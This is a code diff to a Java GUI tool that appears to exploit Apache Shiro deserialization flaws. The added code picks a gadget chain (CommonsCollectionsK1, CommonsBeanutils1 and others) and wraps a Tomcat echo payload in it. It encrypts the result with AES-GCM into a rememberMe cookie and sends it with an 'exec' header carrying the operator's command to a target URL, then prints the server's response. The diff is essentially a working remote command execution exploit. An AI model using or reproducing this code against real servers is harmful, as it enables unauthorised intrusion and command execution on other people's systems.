@@ -1,10 +1,9 @@
 package cn.safe6;
 
 import cn.safe6.core.*;
-import cn.safe6.util.HttpTool;
-import cn.safe6.util.LogUtil;
-import cn.safe6.util.ShiroTool;
-import cn.safe6.util.Tools;
+import cn.safe6.payload.TomcatEcho;
+import cn.safe6.util.*;
+import javafx.application.Platform;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
 import javafx.event.ActionEvent;
@@ -13,6 +12,7 @@ import javafx.geometry.Insets;
 import javafx.geometry.Pos;
 import javafx.scene.control.*;
 import javafx.scene.control.Alert.AlertType;
+import java.lang.reflect.Method;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
 import javafx.scene.layout.GridPane;
@@ -23,16 +23,15 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
 import org.apache.commons.io.FileUtils;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.util.EntityUtils;
 
 import java.io.*;
 import java.net.Authenticator;
 import java.net.InetSocketAddress;
 import java.net.PasswordAuthentication;
 import java.net.Proxy;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -146,6 +145,7 @@ public class Controller {
         gadgetData.add("CommonsBeanutils1");
         gadgetData.add("CommonsCollections6");
         gadgetData.add("CommonsCollectionsShiro");
+
         gadget.setValue("CommonsCollectionsK1");
         gadget.setItems(gadgetData);
 
@@ -218,7 +218,47 @@ public class Controller {
             return;
         }
         execCmd.setDisable(true);
-        ClassPool pool = ClassPool.getDefault();
+
+        String expName =gadget.getValue().toString();
+        String url = paramsContext.get("url").toString();
+        String method = paramsContext.get("method").toString();
+        String rmeValue = paramsContext.get("rmeValue").toString();
+        Map<String,Object> params = (Map<String, Object>) paramsContext.get("params");
+        try {
+            Class clazz = Class.forName(Constants.PAYLOAD_PACK+expName);
+            Method mtd = clazz.getMethod("getPayload",byte[].class);
+            byte[] payload = (byte[]) mtd.invoke(null, TomcatEcho.getPayload());
+
+            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"),rmeValue);
+            String encryptData = PayloadEncryptTool.AesGcmEncrypt(payload,key);
+            String data;
+            if (isShowPayload.isSelected()){
+                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
+                Controller.logUtil.printInfoLog(encryptData,true);
+            }
+
+            //请求包header超过8k会报header too large错误
+            header.put("cookie",rememberMe+"="+encryptData);
+            header.put("exec",cmd1);
+            CloseableHttpResponse closeableHttpResponse;
+            if (method.equals(Constants.METHOD_GET)){
+                closeableHttpResponse = HttpClientUtil.httpGetRequest3(url, header);
+            }else {
+                closeableHttpResponse = HttpClientUtil.httpPostRequest2(url,header,params);
+            }
+            if (closeableHttpResponse!=null){
+                data = EntityUtils.toString(closeableHttpResponse.getEntity(),"utf-8");
+                logUtil.printSucceedLog(data);
+                logUtil.printSucceedLog(Arrays.toString(closeableHttpResponse.getAllHeaders()));
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }finally {
+            Platform.runLater(() -> execCmd.setDisable(false));
+        }
+
+        //ClassPool pool = ClassPool.getDefault();
 /*        CtClass clazz = null;
         try {
             clazz = pool.get("cn.safe6.payload.evil.");
